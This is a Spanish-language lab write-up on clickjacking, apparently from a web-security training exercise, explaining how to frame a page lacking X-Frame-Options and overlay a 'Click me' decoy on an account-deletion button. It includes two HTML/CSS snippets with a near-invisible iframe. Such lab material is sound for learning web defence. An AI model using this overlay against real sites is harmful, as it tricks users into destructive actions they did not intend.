Este laboratorio muestra cómo realizar un ataque de clickjacking incluso cuando la acción sensible está protegida por un token CSRF. Se aprovecha la falta de encabezados de protección como X-Frame-Options para incrustar la página vulnerable dentro de un iframe en un sitio externo.

La estrategia consiste en superponer un elemento visual atractivo como un botón que diga Click me justo encima del botón de eliminar cuenta. Para ello se ajustan las propiedades de posición, tamaño y opacidad del iframe de forma que el usuario, al intentar hacer clic en el contenido visible del sitio señuelo, en realidad pulse sobre la acción destructiva del sitio objetivo.

Este tipo de ataque es posible cuando no existen medidas que impidan la carga del sitio objetivo en iframes de terceros, y es aún más efectivo cuando el usuario realiza la acción de manera involuntaria al seguir una instrucción aparentemente inofensiva como haz clic aquí.

Este laboratorio permite comprender cómo técnicas visuales engañosas pueden ser tan efectivas como vulnerabilidades técnicas si la interfaz no está debidamente protegida.

------

Este lab es para cuando la victima haga click, se borre su cuenta, por ello creamos un iframe con la pagina principal


```html
<style>
    iframe{
        width: 500px;
        height: 500px;
        opacity: 0.1;
    }
    div{
        position: relative;
        top: 550px;
        left: 35px;
    }
</style>
<div>testeando</div>
<iframe src="http://burpsuite.com"></iframe>
```

Ahora que ya tenemos la idea que queremos hacer, pasamos a lo siguiente:

```html
<style>
    iframe{
        width: 500px;
        height: 500px;
        opacity: 0.01; /*Para que no sea casi visible*/
    }
    div{
        position: absolute;
        top: 550px;
        left: 40px;
    }
</style>
<div>Click me</div>
<iframe src="http://burpsuite.com"></iframe>
```